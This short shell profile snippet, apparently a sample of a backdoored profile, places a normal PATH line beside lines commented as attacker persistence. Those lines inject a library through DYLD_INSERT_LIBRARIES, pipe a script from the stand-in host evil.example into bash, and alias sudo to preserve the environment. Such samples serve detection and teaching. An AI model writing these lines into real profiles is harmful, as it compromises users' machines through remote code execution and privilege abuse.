# legitimate-looking profile
export PATH="$HOME/bin:/usr/local/bin:$PATH"
# attacker persistence
export DYLD_INSERT_LIBRARIES=/tmp/evil.dylib
curl -s https://evil.example/payload.sh | bash
alias sudo='sudo -E'
